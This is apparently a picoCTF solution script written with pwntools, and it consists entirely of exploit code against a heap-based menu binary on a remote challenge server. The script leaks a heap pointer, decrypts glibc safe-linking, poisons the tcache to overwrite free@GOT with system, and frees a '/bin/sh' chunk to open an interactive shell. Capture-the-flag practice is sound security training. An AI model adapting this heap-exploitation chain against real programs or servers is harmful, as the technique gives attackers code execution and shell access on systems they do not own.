#!/usr/bin/python3

from pwn import *
from time import *
#p = process("./vuln_patched")
p = remote("saturn.picoctf.net", 56127)
elf = ELF("./vuln_patched", checksec = 0)
libc = elf.libc

c = lambda a : p.sendlineafter(b"Choice: ", str(a))
s = lambda a: p.send(a)
sl = lambda a: p.sendline(a)
sla = lambda a, b: p.sendlineafter(a, b)
ru = lambda a: p.recvuntil(a)
d = lambda : gdb.attach(p ,gdbscript = """
        set resolve-heap-via-heuristic on
        """)
def alpha(heap, target):
    return target ^ (heap >> 0xc)
def decrypt(cipher):
    key = 0
    for i in range(1, 6):
        bits = 64 - 12 * i
        if bits < 0:
            bits = 0
        plain = ((cipher ^ key) >> bits) << bits
        key = plain >> 12
    return plain
def cheat(idx, data, spot):
    c(0)
    sla(b"? ", str(idx))
    sla(b"characters: ", data)
    sla(b"? ", str(spot))

def add(idx, size, data):
    c(1)
    sla(b"? ", str(idx))
    sla(b"? ", str(size))
    sla(b"characters: ", data)

def remove(idx):
    c(2)
    sla(b"? ", str(idx))

def race():
    c(3)

def exploit():
    for i in range(8):
        add(i, 0x20, b"\xff")
    for i in range(8):
        remove(i)
    for i in range(8):
        add(i, 0x20, b"\xff")
    race()
    ru(b"WINNER: ")
    heap_leak = u64(p.recvline().strip(b"\n").ljust(8, b"\x00"))
    heap_leak = decrypt(heap_leak) #- 0x5b0
    print(hex(heap_leak))
    remove(0)
    remove(1)
    remove(2)
    cheat(2, p64(alpha(heap_leak, elf.got.free- 0x8)) * 2 , 1)
    add(0, 0x20, b"A" * 0x20)
    sleep(0.5)
    print("FIRST SLEEP")
    add(1, 0x20, p64(elf.plt.system) * 2+ b"\xff")
    sleep(0.5)
    add(2, 0x30, b"/bin/sh\x00\xff")
    sleep(0.5)
    remove(2)
    #d()
    p.interactive()
exploit()
